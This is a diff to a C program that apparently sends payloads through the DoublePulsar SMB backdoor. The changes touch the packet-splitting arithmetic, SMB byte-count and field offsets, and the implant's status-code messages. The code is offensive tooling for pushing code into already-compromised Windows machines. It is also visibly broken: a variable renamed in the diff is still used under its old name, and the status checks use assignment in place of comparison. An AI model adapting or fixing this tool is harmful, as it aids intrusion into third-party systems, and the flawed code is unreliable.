@@ -584,7 +584,7 @@ int main(int argc, char* argv[])
 	memset(pFULLBUFFER, 0x00, payload_totalsize);
 
 	int numberofpackets = payload_totalsize / 4096;
-	int iterations = payload_totalsize % 4096;
+	int remainder = payload_totalsize % 4096;
 	printf("will send %d packets\n ", numberofpackets);
 	printf("%d as a remainder\n", iterations);
 
@@ -625,7 +625,7 @@ int main(int argc, char* argv[])
 	unsigned char* big_packet = (unsigned char*)malloc(4096 + 12 + 70);
 	int size_normal_packet = 4096 + 12 + 70;
 
-	unsigned char* last_packet = (unsigned char*)malloc(iterations + 12 + 70);
+	unsigned char* last_packet = (unsigned char*)malloc(remainder + 12 + 70);
 	int size_last_packet = iterations + 12 + 70;
 
 	for (ctx = 0; ctx < payload_totalsize;)
@@ -660,7 +660,7 @@ int main(int argc, char* argv[])
 
 			TotalDataCount = bytesLeft;
 			DataCount = bytesLeft;
-			byteCount = bytesLeft + 13;
+			byteCount = bytesLeft + 12;
 
 			*(WORD*)(last_packet + 0x27) = TotalDataCount;
 			*(WORD*)(last_packet + 0x3b) = DataCount;
@@ -692,19 +692,19 @@ int main(int argc, char* argv[])
 		
 			if (recvbuff[34] = 0x52)
 			{
-				printf("Doublepulsar returned 82!\n");
+				printf("Doublepulsar returned: Success!\n");
 			}
-		
+			
 			else if (recvbuff[34] = 0x62)
 			{
 				printf("Doublepulsar returned: Invalid parameters!\n");
 			}
-					
+			
 			else if (recvbuff[34] = 0x72)
 			{
 				printf("Doublepulsar returned: Allocation failure!\n");
 			}
-			
+				
 			else {
 				printf("Doublepulsar didn't work!\n");
 			}
@@ -749,19 +749,19 @@ int main(int argc, char* argv[])
 	
 		if (recvbuff[34] = 0x52)
 		{
-			printf("Doublepulsar returned 82!\n");
+			printf("Doublepulsar returned: Success!\n");
 		}
-	
+			
 		else if (recvbuff[34] = 0x62)
 		{
 			printf("Doublepulsar returned: Invalid parameters!\n");
 		}
-				
+			
 		else if (recvbuff[34] = 0x72)
 		{
 			printf("Doublepulsar returned: Allocation failure!\n");
 		}
-		
+				
 		else {
 			printf("Doublepulsar didn't work!\n");
 		}
